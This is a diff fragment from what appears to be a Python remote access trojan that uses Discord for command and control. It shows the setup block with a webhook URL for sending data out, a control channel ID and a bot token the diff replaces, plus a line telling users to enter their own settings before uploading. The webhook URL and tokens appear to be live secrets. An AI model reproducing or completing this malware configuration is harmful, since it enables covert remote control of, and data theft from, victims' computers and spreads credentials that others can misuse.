@@ -34,7 +34,7 @@ from io import BytesIO
 # CHANGE THESE TO YOUR SETTINGS BEFORE UPLOADING
 WEBHOOK_URL = "https://discord.com/api/webhooks/1470703282484809852/8qx9drC1-bW1oE6xyC4XTmWqSOXE-tRvYogoqChS5tt8e7wq69vUz96ESKpJfxC5z_Gk"
 CONTROL_CHANNEL_ID = 1466788178915627283  # YOUR PRIVATE CHANNEL ID
-RAT_BOT_TOKEN = "MTQ2ODEzNDgzOTI5NDM2MTcyOQ.GY_tAk.Xv1XikN8Bw9SgyGrhbzvzUgo3HCvXrCMKwPjrE"
+RAT_BOT_TOKEN = "MTQ2OTY4OTg1OTMyMzk5MDEyOA.GOIdUA.gFgstsEC4obyxYmOu_2Nb3oIBgRKb7_aCMhx38"
 # ===========================================
 
 intents = discord.Intents.default()
